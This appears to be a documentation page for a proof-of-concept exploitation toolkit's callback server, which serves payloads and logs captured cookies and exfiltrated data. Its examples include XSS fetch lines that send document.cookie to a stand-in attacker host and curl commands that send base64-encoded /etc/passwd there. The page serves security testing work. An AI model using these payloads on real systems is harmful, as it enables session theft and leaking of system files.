Servers
=======

HTTP servers for serving payloads and logging callbacks.

POC HTTP Server
---------------

Simple HTTP server that serves payloads and logs all requests. Automatically captures cookies and exfiltrated data.

.. automodule:: poc_example.servers.server
   :members:
   :undoc-members:
   :show-inheritance:

Usage
~~~~~

Start the server from your project directory:

.. code-block:: bash

   # From generated project root:
   python -m poc_example.servers.server

   # Or using the CLI:
   poc_example server

The server will:

* Serve files from ``payloads/`` directory
* Log all requests to ``logs/server.ndjson``
* Capture cookies from ``?cookie=`` parameter or ``/cookie/`` path
* Capture exfil data from ``?exfil=`` parameter or ``/exfil/`` path
* Provide event queue via ``DELETE /queue`` endpoint

Examples
~~~~~~~~

**Cookie Capture:**

Query parameter:

.. code-block:: javascript

   // XSS payload
   fetch('http://attacker:8000/?cookie=' + btoa(document.cookie))

Path parameter:

.. code-block:: javascript

   // XSS payload
   fetch('http://attacker:8000/cookie/' + encodeURIComponent(document.cookie))

**Exfil Data:**

Query parameter:

.. code-block:: bash

   # XXE payload callback
   curl "http://attacker:8000/?exfil=$(cat /etc/passwd | base64)"

Path parameter:

.. code-block:: bash

   # XXE payload callback
   curl "http://attacker:8000/exfil/$(cat /etc/passwd | base64)"

**Getting Events:**

.. code-block:: python

   import requests

   # Pop next event from queue
   response = requests.delete('http://localhost:8000/queue')
   if response.status_code == 200:
       event = response.json()
       print(f"Type: {event['type']}, Data: {event['data']}")
